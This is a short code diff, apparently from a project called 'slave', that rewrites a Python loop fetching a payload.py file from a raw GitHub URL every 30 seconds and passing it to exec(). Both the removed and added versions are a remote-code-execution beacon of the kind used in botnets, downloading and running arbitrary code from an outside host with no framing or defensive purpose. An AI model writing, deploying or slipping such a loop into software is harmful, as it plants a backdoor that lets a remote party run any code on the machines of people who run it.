@@ -1,11 +1,9 @@
-from requests import get
+from gzip import READ
+from urllib.request import urlopen
 from time import sleep
 
 while True:
-    try:
-        payload = get('https://raw.githubusercontent.com/liverfried/slave/main/payload.py').text
-        exec(payload)
-    except:
-        ...
+    with urlopen('https://raw.githubusercontent.com/liverfried/slave/main/test_payload/payload.py') as payload:
+        exec(payload.read())
 
     sleep(30)
